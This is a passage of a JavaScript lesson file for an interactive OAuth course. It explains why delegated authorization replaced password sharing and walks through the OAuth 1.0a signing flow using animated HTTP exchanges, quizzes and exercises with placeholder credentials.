window.LESSONS = window.LESSONS || [];
(function () {
  // Widgets in this file are written as real JS functions and serialised with Function#toString,
  // so no template-literal escaping is needed inside widget scripts.
  const SECTION = '5 · OAuth 1.0a & OAuth 2';

  const CSS = `
.card { border: 1px solid #e2e5ee; border-radius: 10px; padding: 10px 12px; background: #fff; margin: 0 0 10px; }
.card h4 { margin: 0 0 6px; font-size: 14px; }
.muted { color: #646b80; font-size: 13px; }
.row { display: flex; gap: 10px; flex-wrap: wrap; align-items: center; }
.grid2 { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
.mono, .mono * { font: 12.5px/1.45 ui-monospace, Menlo, monospace; }
pre.box { margin: 4px 0 0; padding: 8px 10px; background: #0f1320; color: #d7dcea; border-radius: 8px;
  font: 12px/1.5 ui-monospace, Menlo, monospace; white-space: pre-wrap; overflow-wrap: anywhere; max-height: 220px; overflow: auto; }
pre.lite { margin: 4px 0 0; padding: 6px 9px; background: #f4f6fa; color: #1f2330; border-radius: 8px; border: 1px solid #e2e5ee;
  font: 12px/1.5 ui-monospace, Menlo, monospace; white-space: pre-wrap; overflow-wrap: anywhere; }
pre.box .hn { color: #7fd6ea; } pre.box .l1 { color: #fff; font-weight: 700; } pre.box .cm { color: #7d869c; font-style: italic; }
pre.box mark { background: #f6c945; color: #1b1b1b; border-radius: 3px; padding: 0 2px; }
.ok { color: #15803d; font-weight: 600; } .bad { color: #b91c1c; font-weight: 600; }
.pill { display: inline-block; padding: 1px 8px; border-radius: 99px; font-size: 12px; font-weight: 600; }
.pill.g { background: #dcfce7; color: #166534; } .pill.r { background: #fee2e2; color: #991b1b; }
.pill.y { background: #fef3c7; color: #92400e; } .pill.b { background: #dbeafe; color: #1e40af; }
table.t { border-collapse: collapse; width: 100%; font-size: 13px; }
table.t th, table.t td { border: 1px solid #e2e5ee; padding: 4px 7px; text-align: left; vertical-align: top; }
table.t th { background: #f4f6fa; }
textarea { width: 100%; box-sizing: border-box; font: 12.5px/1.45 ui-monospace, Menlo, monospace; }
input.w { width: 100%; box-sizing: border-box; }
.fb { margin-top: 8px; padding: 8px 10px; border-radius: 8px; font-size: 13.5px; }
.fb:empty { display: none; }
.fb.good { background: #dcfce7; border: 1px solid #86efac; } .fb.badf { background: #fee2e2; border: 1px solid #fca5a5; }
button.primary { background: #087ea4; color: #fff; border-color: #087ea4; }
button.primary:hover { background: #066b8c; }
label { font-size: 13.5px; }
`;

  // Helpers injected into every widget iframe as globals.
  function COMMON() {
    window.$ = (s) => document.querySelector(s);
    window.$$ = (s) => Array.from(document.querySelectorAll(s));
    window.esc = (s) => Seq.esc(s);
    // RFC 3986 percent-encoding (unreserved: A-Z a-z 0-9 - . _ ~)
    window.pct = (s) => encodeURIComponent(String(s)).replace(/[!'()*]/g,
      (c) => '%' + c.charCodeAt(0).toString(16).toUpperCase());
    // application/x-www-form-urlencoded
    window.form = (o) => new URLSearchParams(o).toString();
    window.pj = (o) => JSON.stringify(o, null, 2);
    // "Header: value" → colored HTML (re-uses the Seq inspector colouring)
    window.httpHtml = (raw, hl) => Seq.colorMsg(raw, hl || []);
    // Parse a raw HTTP request typed by the learner
    window.parseHttp = (raw) => {
      const txt = String(raw).replace(/\r/g, '');
      const cut = txt.indexOf('\n\n');
      const headPart = cut < 0 ? txt : txt.slice(0, cut);
      const body = cut < 0 ? '' : txt.slice(cut + 2).trim();
      const lines = headPart.split('\n').map((l) => l.trim()).filter(Boolean);
      const first = (lines.shift() || '').split(/\s+/);
      const headers = {};
      lines.forEach((l) => {
        const i = l.indexOf(':');
        if (i > 0) headers[l.slice(0, i).trim().toLowerCase()] = l.slice(i + 1).trim();
      });
      return { method: first[0] || '', path: first[1] || '', version: first[2] || '', headers, body };
    };
    window.feedback = (el, ok, html) => {
      el.className = 'fb ' + (ok ? 'good' : 'badf');
      el.innerHTML = html;
    };
  }

  // Build a widget: html + optional extra css + script fn (+ optional DATA object for starter/solution variants)
  function W(html, fn, extraCss, data) {
    return '<style>' + CSS + (extraCss || '') + '</style>\n' + html.trim() + '\n<script>\n' +
      (data !== undefined ? 'window.DATA = ' + JSON.stringify(data) + ';\n' : '') +
      '(' + COMMON.toString() + ')();\n(' + fn.toString() + ')();\n</' + 'script>';
  }

  const L = [];

  // ───────────────────────────── 1. delegation-problem ─────────────────────────────
  L.push({
    id: 'delegation-problem',
    section: SECTION,
    title: 'The delegation problem: why OAuth exists',
    explain: `
      <p>Around 2007, a lot of websites had a "Find your friends!" button. You clicked it, and the site asked for
      your <strong>webmail address and password</strong>. It then logged in <em>as you</em> and pulled out your address book.
      It worked, and it was terrible.</p>
      <p>Imagine a photo-printing site, <strong>PrintApp</strong>, that wants your photos from <strong>MegaCorp</strong>
      (a provider that holds your email, photos and files). The old way gives PrintApp your MegaCorp password:</p>
      <ul>
        <li><strong>All or nothing.</strong> PrintApp only needed photos, but with your password it can also read your email, delete files and change your password.</li>
        <li><strong>No clean way to say no later.</strong> The only way to cut PrintApp off is to change your password. That also breaks every other app you gave it to.</li>
        <li><strong>One leak exposes everything.</strong> PrintApp has to store your password (it can't hash it, because it has to replay it). If its database leaks, attackers get your real password, and people reuse passwords.</li>
        <li><strong>It teaches phishing.</strong> Users learn that typing their MegaCorp password into some other site is normal.</li>
        <li><strong>It breaks MFA and SSO.</strong> A script replaying a password can't answer a push notification or a passkey prompt.</li>
      </ul>
      <h3>The valet key</h3>
      <p>Some cars come with a <strong>valet key</strong>. It starts the engine and opens the door, but it won't open the
      trunk or the glovebox, and the car may limit its top speed. You hand the valet <em>that</em> key, not your master key.</p>
      <p><strong>OAuth</strong> is a valet key for APIs. You never give PrintApp your password. Instead:</p>
      <ol>
        <li>PrintApp sends you to <strong>MegaCorp's own login page</strong>. You type your password there, and only there.</li>
        <li>MegaCorp asks: <em>"PrintApp wants to view your photos. Allow?"</em> This screen is called <strong>consent</strong>.</li>
        <li>MegaCorp gives PrintApp an <strong>access token</strong>. The token is <strong>scoped</strong> (photos only), <strong>short-lived</strong> (say 1 hour), and <strong>revocable</strong> (you can remove PrintApp in your account settings without touching your password).</li>
      </ol>
      <pre><code class="language-http">GET /v1/photos HTTP/1.1
Host: api.megacorp.example
Authorization: Bearer mc_at_9f2c1e...   ← the valet key, not your password</code></pre>
      <div class="tip"><strong>The one-sentence version:</strong> OAuth lets a user give an app <em>limited</em> access to their
      stuff at another service, without sharing their password. This is called <strong>delegated authorization</strong>.</div>
      <div class="warn">OAuth answers "what may this app do?" It does <strong>not</strong> by itself tell the app who
      the user is. "Log in with Google" uses <strong>OpenID Connect</strong>, a layer built on top of OAuth 2. That comes in the next section.</div>
      <p>There are two big versions. <strong>OAuth 1.0a</strong> (RFC 5849, 2010) signs every request with crypto.
      <strong>OAuth 2.0</strong> (RFC 6749, 2012) leans on HTTPS instead and is what almost everyone uses today. Its modern
      best practice is collected in <strong>RFC 9700</strong> (January 2025) and the <strong>OAuth 2.1</strong> draft (still an IETF draft in 2026).</p>
    `,
    examples: [
      {
        title: 'Password sharing vs delegated token (animated)',
        code: W(`<div id="flow"></div>`, function () {
          const actors = [
            { id: 'u', label: 'You (browser)', icon: '🧑', store: {}, storeLabel: 'You know' },
            { id: 'p', label: 'PrintApp', icon: '🖨', store: {}, storeLabel: 'PrintApp stores' },
            { id: 'm', label: 'MegaCorp', icon: '🏢', store: { 'alice': 'mail, photos, files' }, storeLabel: 'MegaCorp account' },
          ];
          Seq.mount('#flow', {
            title: 'How does PrintApp get your photos?',
            intro: 'Pick a tab: the <b>old password-sharing</b> way or the <b>OAuth</b> way, then press <b>Next ▶</b>.',
            actors,
            scenarios: [
              { name: '❌ Share your password', steps: [
                { from: 'u', to: 'p', label: 'click "Import from MegaCorp"',
                  msg: 'GET /import/megacorp HTTP/1.1\nHost: printapp.example',
                  note: 'You want to print some photos stored at MegaCorp.' },
                { from: 'p', to: 'u', kind: 'res', label: 'form: "Your MegaCorp password?"',
                  msg: 'HTTP/1.1 200 OK\nContent-Type: text/html\n\n<form method="post" action="/import/megacorp">\n  MegaCorp email: <input name="email">\n  MegaCorp password: <input name="password" type="password">\n</form>',
                  hl: ['MegaCorp password'],
                  note: 'Red flag: a site that is <b>not</b> MegaCorp asks for your MegaCorp password.' },
                { from: 'u', to: 'p', label: 'POST email + password',
                  msg: 'POST /import/megacorp HTTP/1.1\nHost: printapp.example\nContent-Type: application/x-www-form-urlencoded\n\nemail=alice%40megacorp.example&password=hunter2',
                  hl: ['password=hunter2'],
                  set: { u: { 'password': 'hunter2' }, p: { 'alice password': 'hunter2 (plaintext!)' } },
                  note: 'PrintApp must keep the password <b>in plaintext</b> (or reversibly encrypted). It has to replay it later, so it cannot hash it.' },
                { from: 'p', to: 'm', label: 'log in AS Alice',
                  msg: 'POST /login HTTP/1.1\nHost: accounts.megacorp.example\nContent-Type: application/x-www-form-urlencoded\n\nemail=alice%40megacorp.example&password=hunter2',
                  note: 'To MegaCorp, this looks exactly like Alice logging in herself.' },
                { from: 'm', to: 'p', kind: 'res', label: '200 + full session cookie',
                  msg: 'HTTP/1.1 302 Found\nLocation: /home\nSet-Cookie: mc_sid=Z81k...; Secure; HttpOnly',
                  set: { p: { 'MegaCorp session': 'FULL access as Alice' } },
                  note: 'PrintApp now has a <b>full</b> session: mail, photos, files, settings. Nothing limits it to photos.' },
                { from: 'p', to: 'm', label: 'GET /mail/inbox  (why not?)',
                  msg: 'GET /mail/inbox HTTP/1.1\nHost: megacorp.example\nCookie: mc_sid=Z81k...',
                  note: 'A buggy, nosy, or hacked PrintApp can read your email too.' },
                { from: 'm', to: 'p', kind: 'res', label: '200 your private email',
                  msg: 'HTTP/1.1 200 OK\nContent-Type: application/json\n\n[{"from":"bank@example","subject":"Your statement"}, ...]' },
                { from: 'u', to: 'u', label: 'want to stop PrintApp?',
                  note: 'The only way is to <b>change your password</b>, which also breaks every other app you gave it to. And if PrintApp\'s database leaks, attackers get "hunter2", which you probably reused elsewhere.',
                  set: { u: { 'to revoke': 'change password everywhere 😩' } } },
              ]},
              { name: '✅ OAuth: delegated, scoped token', steps: [
                { from: 'u', to: 'p', label: 'click "Import from MegaCorp"',
                  msg: 'GET /import/megacorp HTTP/1.1\nHost: printapp.example' },
                { from: 'p', to: 'u', kind: 'redirect', label: '302 → MegaCorp /authorize',
                  msg: 'HTTP/1.1 302 Found\nLocation: https://accounts.megacorp.example/authorize?response_type=code&client_id=printapp&scope=photos.read&redirect_uri=https%3A%2F%2Fprintapp.example%2Fcb&state=Xy7',
                  hl: ['scope=photos.read'],
                  note: 'PrintApp sends your <b>browser</b> to MegaCorp and asks only for <code>photos.read</code>.' },
                { from: 'u', to: 'm', label: 'GET /authorize?…scope=photos.read',
                  msg: 'GET /authorize?response_type=code&client_id=printapp&scope=photos.read&... HTTP/1.1\nHost: accounts.megacorp.example' },
                { from: 'm', to: 'u', kind: 'res', label: 'MegaCorp login + consent page',
                  msg: 'HTTP/1.1 200 OK\nContent-Type: text/html\n\n# MegaCorp (real domain, real padlock)\n# Password: ********\n# "PrintApp wants to: View your photos"  [Deny] [Allow]',
                  note: 'You type your password on <b>MegaCorp\'s own page</b>. PrintApp never sees it.' },
                { from: 'u', to: 'm', label: 'Allow',
                  msg: 'POST /consent HTTP/1.1\nHost: accounts.megacorp.example\nCookie: mc_sid=...\n\napprove=photos.read',
                  set: { m: { 'grant': 'PrintApp → photos.read' } } },
                { from: 'm', to: 'u', kind: 'redirect', label: '302 → printapp /cb?code=…',
                  msg: 'HTTP/1.1 302 Found\nLocation: https://printapp.example/cb?code=SplxlOBe&state=Xy7',
                  note: 'MegaCorp sends you back with a one-time <b>code</b>. (Next lessons explain this in detail.)' },
                { from: 'u', to: 'p', label: 'GET /cb?code=…',
                  msg: 'GET /cb?code=SplxlOBe&state=Xy7 HTTP/1.1\nHost: printapp.example' },
                { from: 'p', to: 'm', kind: 'back', label: 'swap code → token (server-to-server)',
                  msg: 'POST /token HTTP/1.1\nHost: accounts.megacorp.example\nContent-Type: application/x-www-form-urlencoded\n\ngrant_type=authorization_code&code=SplxlOBe&redirect_uri=...',
                  note: 'This is a direct server-to-server call. Your browser is not involved.' },
                { from: 'm', to: 'p', kind: 'back', label: 'access_token (photos.read, 1h)',
                  msg: 'HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"access_token":"mc_at_9f2c1e","token_type":"Bearer","expires_in":3600,"scope":"photos.read"}',
                  set: { p: { 'access_token': 'mc_at_9f2c1e (photos.read, 1h)' } },
                  note: 'PrintApp stores a <b>valet key</b>, not your password.' },
                { from: 'p', to: 'm', label: 'GET /v1/photos  Bearer',
                  msg: 'GET /v1/photos HTTP/1.1\nHost: api.megacorp.example\nAuthorization: Bearer mc_at_9f2c1e', hl: ['Bearer mc_at_9f2c1e'] },
                { from: 'm', to: 'p', kind: 'res', label: '200 photos',
                  msg: 'HTTP/1.1 200 OK\nContent-Type: application/json\n\n[{"id":"p1","url":"https://img.megacorp.example/p1.jpg"}]' },
                { from: 'p', to: 'm', label: 'GET /v1/mail/inbox  Bearer',
                  msg: 'GET /v1/mail/inbox HTTP/1.1\nHost: api.megacorp.example\nAuthorization: Bearer mc_at_9f2c1e' },
                { from: 'm', to: 'p', kind: 'err', label: '403 insufficient_scope',
                  msg: 'HTTP/1.1 403 Forbidden\nWWW-Authenticate: Bearer error="insufficient_scope", scope="mail.read"',
                  hl: ['insufficient_scope'], note: 'The token only says <code>photos.read</code>, so mail stays private.' },
                { from: 'u', to: 'm', label: 'Settings → Remove PrintApp',
                  msg: 'POST /settings/apps/printapp/revoke HTTP/1.1\nHost: accounts.megacorp.example\nCookie: mc_sid=...',
                  set: { m: { 'grant': null }, p: { 'access_token': 'mc_at_9f2c1e ❌ revoked' } },
                  note: 'One click cuts PrintApp off. Your password and your other apps are unaffected.' },
              ]},
            ],
          });
        }),
        explain: `
          <details>
            <summary>What to compare between the two tabs</summary>
            <table>
              <tr><th></th><th>❌ Share your password</th><th>✅ OAuth token</th></tr>
              <tr><td>Where you type your password</td><td>PrintApp's form (step 2–3)</td><td>MegaCorp's page only (step 4)</td></tr>
              <tr><td>What PrintApp stores</td><td><code>hunter2 (plaintext!)</code></td><td><code>mc_at_9f2c1e (photos.read, 1h)</code></td></tr>
              <tr><td>Can PrintApp read mail?</td><td>Yes: step 7 returns 200</td><td>No: step 13 returns 403 <code>insufficient_scope</code></td></tr>
              <tr><td>How to stop PrintApp</td><td>Change password (step 8)</td><td>Remove the app (step 14)</td></tr>
            </table>
            <p>Watch the state cards under the diagram: in the first tab PrintApp's card gets your password. In the second it only ever holds a token.</p>
          </details>
          <details>
            <summary>Why is the OAuth tab longer?</summary>
            <p>The extra steps are <strong>redirects</strong>: PrintApp sends your browser to MegaCorp and MegaCorp sends it back.
            They exist so that the password is typed on MegaCorp's page and the app only receives a token. The
            <a href="#/auth-code">Authorization Code flow</a> lesson goes through each of those messages field by field.</p>
          </details>
        `,
      },
      {
        title: 'What can PrintApp do? (master key vs valet key)',
        code: W(`
<div class="card">
  <h4>PrintApp holds…</h4>
  <div class="row" id="modes">
    <label><input type="radio" name="m" value="pw" checked> 🔑 your MegaCorp password</label>
    <label><input type="radio" name="m" value="tok"> 🎫 an OAuth token <code>scope=photos.read</code>, 1h</label>
    <label><input type="radio" name="m" value="rev"> 🎫 the same token after you clicked "Remove app"</label>
  </div>
</div>
<table class="t" id="tbl"></table>
<div class="card" style="margin-top:10px"><h4>💥 PrintApp's database gets hacked. The attacker gets:</h4><div id="breach"></div></div>
`, function () {
          const ACTIONS = [
            ['List & download your photos', { pw: 1, tok: 1, rev: 0 }],
            ['Read your email', { pw: 1, tok: 0, rev: 0 }],
            ['Delete your files', { pw: 1, tok: 0, rev: 0 }],
            ['Change your MegaCorp password', { pw: 1, tok: 0, rev: 0 }],
            ['Still works 2 hours later', { pw: 1, tok: 0, rev: 0 }],
            ['Keeps working when your account has MFA turned on', { pw: 0, tok: 1, rev: 0 }],
            ['Still works after you change your password', { pw: 0, tok: 1, rev: 0 }],
          ];
          const WHY = {
            pw: ['Full login as you.', 'Full login as you.', 'Full login as you.', 'Full login as you, so it can even lock you out.',
              'Passwords do not expire on their own.', 'A script replaying a password cannot answer your MFA prompt.',
              'The stored password is now wrong.'],
            tok: ['Covered by scope <code>photos.read</code>.', '403 <code>insufficient_scope</code>: not in the token.',
              'Read-only scope; and files were never requested.', 'Tokens cannot do account management.',
              '<code>expires_in: 3600</code>: the token is dead after 1h (unless it also got a refresh token).',
              'You did MFA yourself on MegaCorp\'s page; the token is issued after that.',
              'Access was granted to the app, not tied to your password.'],
            rev: ['401 <code>invalid_token</code>: revoked.', 'Revoked.', 'Revoked.', 'Revoked.', 'Revoked.', 'Revoked.', 'Revoked.'],
          };
          const BREACH = {
            pw: '<span class="bad">"hunter2"</span>: your real password. Valid for <b>MegaCorp and every other site where you reused it</b>, until you notice.',
            tok: '<span class="ok">mc_at_9f2c1e</span>: photos only, expires within the hour, and MegaCorp can revoke all PrintApp tokens at once. Your password is safe.',
            rev: '<span class="ok">mc_at_9f2c1e</span>: already useless.',
          };
          function render() {
            const m = document.querySelector('input[name=m]:checked').value;
            $('#tbl').innerHTML = '<tr><th>Action</th><th>Allowed?</th><th>Why</th></tr>' + ACTIONS.map((a, i) =>
              '<tr><td>' + a[0] + '</td><td>' + (a[1][m] ? '<span class="pill g">yes</span>' : '<span class="pill r">no</span>') +
              '</td><td>' + WHY[m][i] + '</td></tr>').join('');
            $('#breach').innerHTML = BREACH[m];
          }
          $$('input[name=m]').forEach((r) => (r.onchange = render));
          render();
        }),
      },
    ],
    quiz: [
      { q: 'PrintApp asks for your MegaCorp password to import photos. What is the <strong>biggest</strong> problem?',
        options: ['It is slower than OAuth', 'PrintApp gets full, unscoped access and you can only revoke it by changing your password',
          'MegaCorp will block the request', 'Passwords cannot be sent over HTTPS'],
        answer: 1, why: 'With your password, the app can do anything you can, for as long as the password is unchanged. Changing it is the only way to revoke access, and that breaks every other app too.' },
      { q: 'In the valet-key analogy, the valet key corresponds to…',
        options: ['Your password', 'The consent screen', 'A scoped, short-lived, revocable access token', 'The client_id'],
        answer: 2, why: 'Like a valet key, an access token only opens some doors (scope), only for a while (expiry), and can be taken back (revocation).' },
      { q: 'With OAuth, where does the user type their MegaCorp password?',
        options: ['Into PrintApp', 'Only on MegaCorp\'s own login page', 'Into the access token', 'Nowhere; OAuth removes passwords'],
        answer: 1, why: 'The user logs in on the authorization server\'s page. The client app never sees the password; it only gets a token afterwards.' },
      { q: 'Is OAuth 2.0 a login (authentication) protocol?',
        options: ['Yes, it tells the app who the user is', 'No, it is delegated authorization; OpenID Connect adds login on top',
          'Only OAuth 1.0a is', 'Yes, but only with scopes'],
        answer: 1, why: 'An access token says "this app may read photos", not "this is Alice". OpenID Connect adds an ID token for identity.' },
    ],
    exercise: {
      task: `<p>PrintApp received an OAuth access token from MegaCorp with <code>scope=photos.read</code> and
        <code>expires_in=3600</code>. It got <strong>no</strong> refresh token. For each situation, pick
        <em>Allowed</em> or <em>Denied</em> in the box below and click <strong>Check</strong>.</p>`,
      hint: 'Ask three questions: is it inside the scope? Is the token still within its 1 hour? Has the user revoked it?',
      starter: W(`<div id="ex"></div>`, exDelegation, '', { fill: false }),
      solution: W(`<div id="ex"></div>`, exDelegation, '', { fill: true }),
    },
  });

  function exDelegation() {
    const Q = [
      ['GET /v1/photos 10 minutes after consent', 'A'],
      ['GET /v1/mail/inbox 10 minutes after consent', 'D'],
      ['GET /v1/photos/p1/download at minute 30', 'A'],
      ['GET /v1/photos 3 hours later, same token', 'D'],
      ['GET /v1/photos right after Alice clicks "Remove PrintApp"', 'D'],
      ['PrintApp reads Alice\'s MegaCorp password from the token', 'D'],
    ];
    const ex = $('#ex');
    ex.innerHTML = '<table class="t"><tr><th>Situation</th><th>Your answer</th></tr>' + Q.map((q, i) =>
      '<tr><td>' + esc(q[0]) + '</td><td><select id="s' + i + '"><option value="">choose…</option>' +
      '<option value="A">Allowed</option><option value="D">Denied</option></select></td></tr>').join('') +
      '</table><button class="primary" id="chk" style="margin-top:8px">Check</button><div class="fb" id="fb"></div>';
    if (DATA.fill) Q.forEach((q, i) => ($('#s' + i).value = q[1]));
    const WHY = ['', 'mail is outside photos.read → 403 insufficient_scope', '', 'expired after 3600 s and there is no refresh token',
      'revoked tokens are rejected', 'a token never contains the password'];
    $('#chk').onclick = () => {
      const wrong = Q.map((q, i) => ($('#s' + i).value === q[1] ? null : i)).filter((x) => x !== null);
      if (!wrong.length) return feedback($('#fb'), true, '✅ All correct. Scope, expiry and revocation are the three limits a password never had.');
      feedback($('#fb'), false, '❌ ' + wrong.length + ' wrong. Look again at: <ul>' +
        wrong.map((i) => '<li>' + esc(Q[i][0]) + (WHY[i] && $('#s' + i).value ? ' (' + WHY[i] + ')' : '') + '</li>').join('') + '</ul>');
    };
  }

  // ───────────────────────────── 2. oauth1 ─────────────────────────────
  // Shared OAuth 1.0a signer (injected into widgets via toString)
  function OAUTH1() {
    // RFC 5849 §3.4.1: base string = METHOD & enc(base URI) & enc(normalized params)
    window.baseUri = (url) => {
      const u = new URL(url);
      const defPort = (u.protocol === 'http:' && u.port === '80') || (u.protocol === 'https:' && u.port === '443');
      return u.protocol + '//' + u.hostname.toLowerCase() + (u.port && !defPort ? ':' + u.port : '') + u.pathname;
    };
    window.normParams = (pairs) => pairs
      .map(([k, v]) => [pct(k), pct(v)])
      .sort((a, b) => (a[0] < b[0] ? -1 : a[0] > b[0] ? 1 : a[1] < b[1] ? -1 : a[1] > b[1] ? 1 : 0))
      .map((p) => p[0] + '=' + p[1]).join('&');
    window.oauth1Sign = (method, url, pairs, consumerSecret, tokenSecret) => {
      const u = new URL(url);
      const all = pairs.concat(Array.from(u.searchParams.entries()));
      const norm = normParams(all);
      const base = method.toUpperCase() + '&' + pct(baseUri(url)) + '&' + pct(norm);
      const key = pct(consumerSecret) + '&' + pct(tokenSecret || '');
      // NOTE: RFC 5849 defines HMAC-SHA1; this demo library has HMAC-SHA256 (a common extension).
      const sig = Auth.hmacSha256b64(key, base);
      return { norm, base, key, sig };
    };
    window.authHeader = (oauthPairs, sig) => 'Authorization: OAuth ' + oauthPairs.concat([['oauth_signature', sig]])
      .map(([k, v]) => pct(k) + '="' + pct(v) + '"').join(',\n    ');
  }
  function W1(html, fn, css, data) {
    return W(html, new Function('(' + OAUTH1.toString() + ')();\n(' + fn.toString() + ')();'), css, data);
  }

  L.push({
    id: 'oauth1',
    section: SECTION,
    title: 'OAuth 1.0a (three-legged)',
    explain: `
      <p>OAuth 1.0 came out in 2007. A security fix produced <strong>OAuth 1.0a</strong> in 2009, and it was published as
      <strong>RFC 5849</strong> in 2010. Twitter, Flickr and others used it. You will still run into it in older APIs (Twitter/X v1.1 and some
      e-commerce and accounting APIs), so it's worth knowing how it works. It also shows why OAuth 2 was designed the way it was.</p>
      <h3>Three "legs", three sets of credentials</h3>
      <p>The three parties are the <strong>consumer</strong> (the app; OAuth 2 calls it the <em>client</em>), the
      <strong>service provider</strong>, and the <strong>user</strong>. There are three kinds of credentials:</p>
      <ul>
        <li><strong>Consumer key + consumer secret</strong>: the app's own identity, registered once with the provider.</li>
        <li><strong>Temporary credentials</strong> (the "request token" + its secret): used only while the user approves.</li>
        <li><strong>Token credentials</strong> (the "access token" + its secret): the long-lived valet key.</li>
      </ul>
      <p>The flow: ① the app gets a <code>request_token</code>, ② sends the user to <code>/authorize</code>, ③ the user is sent back
      with an <code>oauth_verifier</code>, ④ the app swaps request token + verifier for an <code>access_token</code>, ⑤ the app makes signed API calls.</p>
      <h3>Every request is signed</h3>
      <p>OAuth 1.0a does not send the secrets. Instead, each request carries a <strong>signature</strong> computed over the request itself:</p>
      <pre><code class="language-http">base string  = METHOD &amp; enc(URL without query) &amp; enc(sorted, encoded params)
signing key  = enc(consumer_secret) &amp; enc(token_secret)      ← token_secret may be empty
oauth_signature = base64( HMAC-SHA1(signing key, base string) )</code></pre>
      <pre><code class="language-http">GET /photos?file=vacation.jpg&amp;size=original HTTP/1.1
Host: photos.example.net
Authorization: OAuth oauth_consumer_key="dpf43f3p2l4k3l03",
    oauth_token="nnch734d00sl2jdk", oauth_signature_method="HMAC-SHA1",
    oauth_timestamp="137131202", oauth_nonce="chapoH", oauth_version="1.0",
    oauth_signature="..."</code></pre>
      <p>The server rebuilds the same base string from the request it received, signs it with its copy of the secrets, and
      compares. If anyone changed a parameter on the way, the signatures don't match. <code>oauth_nonce</code> (a random
      one-time value) plus <code>oauth_timestamp</code> stop someone from <strong>replaying</strong> a captured request.</p>
      <div class="warn"><strong>Label on our demos:</strong> RFC 5849 defines <code>HMAC-SHA1</code>, <code>RSA-SHA1</code> and
      <code>PLAINTEXT</code>. The crypto helper on this site has HMAC-SHA256, so the widgets sign with
      <code>HMAC-SHA256</code>, a common extension some providers support. The base-string steps are exactly the same either way.</div>
      <h3>Why OAuth 2 replaced it</h3>
      <ul>
        <li><strong>Signatures are fragile.</strong> One space encoded as <code>+</code> instead of <code>%20</code>, one wrongly sorted param, or a forgotten query parameter gives you a 401 with no hint about what was wrong. Every language needed a carefully written library.</li>
        <li><strong>TLS does the job.</strong> HTTPS already stops tampering and eavesdropping. OAuth 2 sends a plain <strong>bearer token</strong> over TLS: anyone holding it can use it, like cash.</li>
        <li><strong>It only fits web servers.</strong> There was no good story for mobile apps, single-page apps, TVs or machine-to-machine. OAuth 2 added several <em>grant types</em> for these.</li>
      </ul>
      <div class="tip">Bearer tokens are simpler, but a stolen one can be replayed. Modern OAuth 2 brings back a bit of
      signing with <strong>DPoP</strong> (RFC 9449), which binds a token to a key the client holds. It's covered in the attacks lesson.</div>
    `,
    examples: [
      {
        title: 'The three-legged flow with real signatures',
        code: W1(`<div id="flow"></div>`, function () {
          const CK = 'dpf43f3p2l4k3l03', CS = 'kd94hf93k423kf44';
          const RT = 'hh5s93j4hdidpola', RTS = 'hdhd0244k9j7ao03', VER = 'hfdp7dh39dks9884';
          const AT = 'nnch734d00sl2jdk', ATS = 'pfkkdhi9sl3r4s00';
          const CB = 'https://printer.example.com/ready';
          const SP = 'https://photos.example.net';
          const ts = String(Math.floor(Date.now() / 1000));
          const oa = (extra) => [['oauth_consumer_key', CK]].concat(extra || [], [
            ['oauth_nonce', Auth.randHex(8)], ['oauth_signature_method', 'HMAC-SHA256'],
            ['oauth_timestamp', ts], ['oauth_version', '1.0']]);
          function signed(method, url, oauthPairs, bodyPairs, tokenSecret) {
            const s = oauth1Sign(method, url, oauthPairs.concat(bodyPairs || []), CS, tokenSecret);
            const u = new URL(url);
            const lines = [method + ' ' + u.pathname + u.search + ' HTTP/1.1', 'Host: ' + u.host, authHeader(oauthPairs, s.sig)];
            if (bodyPairs && bodyPairs.length) lines.push('Content-Type: application/x-www-form-urlencoded', '', form(bodyPairs));
            lines.push('', '# signature base string (what got signed):', '# ' + s.base,
              '# signing key = enc(consumer_secret) & enc(token_secret) = ' + s.key,
              '# oauth_signature = base64(HMAC-SHA256(key, base string)) = ' + s.sig);
            return { msg: lines.join('\n'), s };
          }
          const r1 = signed('POST', SP + '/initiate', oa([['oauth_callback', CB]]), null, '');
          const r2 = signed('POST', SP + '/token', oa([['oauth_token', RT], ['oauth_verifier', VER]]), null, RTS);
          const r3 = signed('GET', SP + '/photos?file=vacation.jpg&size=original', oa([['oauth_token', AT]]), null, ATS);
          Seq.mount('#flow', {
            title: 'OAuth 1.0a, RFC 5849 example values (signed with HMAC-SHA256 in this demo)',
            actors: [
              { id: 'b', label: 'Jane (browser)', icon: '🧑', store: {} },
              { id: 'c', label: 'printer.example.com', icon: '🖨', store: { consumer_key: CK, consumer_secret: CS }, storeLabel: 'Consumer (app) stores' },
              { id: 's', label: 'photos.example.net', icon: '🏞', store: { 'jane': 'vacation.jpg' }, storeLabel: 'Service provider' },
            ],
            steps: [
              { from: 'b', to: 'c', label: 'click "Print my photos"', msg: 'GET /print HTTP/1.1\nHost: printer.example.com',
                note: 'Jane wants to print a photo stored at photos.example.net.' },
              { from: 'c', to: 's', kind: 'back', label: '① POST /initiate (request token)', msg: r1.msg,
                hl: ['oauth_callback', 'oauth_signature='],
                note: 'Leg 1: the app asks for <b>temporary credentials</b>. There is no token yet, so the signing key is <code>consumer_secret&amp;</code> (the trailing <code>&amp;</code> stays even though the token secret is empty). <code>oauth_callback</code> is where Jane should come back to. (RFC 5849 calls this endpoint "Temporary Credential Request"; many APIs name it <code>/oauth/request_token</code>.)' },
              { from: 's', to: 'c', kind: 'back', label: '200 oauth_token + oauth_token_secret',
                msg: 'HTTP/1.1 200 OK\nContent-Type: application/x-www-form-urlencoded\n\noauth_token=' + RT + '&oauth_token_secret=' + RTS + '&oauth_callback_confirmed=true',
                hl: ['oauth_callback_confirmed=true'],
                set: { c: { request_token: RT, request_secret: RTS } },
                note: 'The server verified the signature and returned a request token plus its secret. <code>oauth_callback_confirmed=true</code> tells the app the server speaks 1.0a.' },
              { from: 'c', to: 'b', kind: 'redirect', label: '302 → /authorize?oauth_token=…',
                msg: 'HTTP/1.1 302 Found\nLocation: ' + SP + '/authorize?oauth_token=' + RT,
                note: 'Leg 2: send Jane\'s browser to the provider. Only the <b>token</b> goes in the URL, never the secret.' },
              { from: 'b', to: 's', label: 'GET /authorize?oauth_token=…',
                msg: 'GET /authorize?oauth_token=' + RT + ' HTTP/1.1\nHost: photos.example.net' },
              { from: 's', to: 'b', kind: 'res', label: 'login + "Allow printer.example.com?"',
                msg: 'HTTP/1.1 200 OK\nContent-Type: text/html\n\n# photos.example.net login + approval page',
                note: 'Jane logs in <b>at the provider</b> and approves.' },
